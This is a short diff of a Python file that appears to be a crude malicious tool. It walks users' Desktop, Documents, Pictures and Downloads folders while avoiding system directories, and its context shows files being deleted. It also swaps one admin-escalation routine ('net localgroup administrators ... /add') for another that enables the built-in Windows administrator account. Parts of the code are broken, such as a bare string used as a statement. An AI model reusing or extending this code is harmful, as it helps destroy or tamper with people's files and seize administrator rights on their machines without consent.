@@ -46,7 +46,7 @@ class functions():
   @staticmethod
   def scanfolder(baseDir, safe=None):
     files = []
-    safeFiles = ['C:/Users/Desktop','C:/Users/Documents','C:/Users/Pictures']
+    safeFiles = ['C:/Users/Desktop','C:/Users/Documents','C:/Users/Pictures','C:/Users/Downloads']
     # Confirm these folders need admin perms to tamper with
     badFiles = ['C:/Windows','C:/Program Files','C:/Program Files (x86)']
     for r, d, f in os.walk(baseDir):
@@ -66,14 +66,9 @@ class functions():
     os.remove(currentFile)
 
   @staticmethod
-  def create_admin():
-    # Creates a local admin and attempts to sign into it(in sub-function)
-
-    # METHOD 1
-    os.system('net localgroup administrators [username] /add')
-    #https://operating-systems.wonderhowto.com/how-to/create-admin-user-account-using-cmd-prompt-windows-0125689/
-
-    # METHOD 2
+  def become_admin():
+    # run cmd as admin then type the following:
+    'Enter the command. runas /user:USERNAME “C:\full\path\of\Program.exe” For example, if you want to start notepad from user Test run this command'
     os.system('net user administrator /active:yes')
     #https://www.ionos.com/digitalguide/server/configuration/enable-administrator-account-windows-10/#:~:text=Quick%20guide%3A%20Enable%20administrator%20account%20in%20Windows%2010,-Using%20a%20command&text=Open%20%E2%80%9CRun%E2%80%9D%20with%20%5BWindows,administrator%20account%20is%20now%20activated.
 
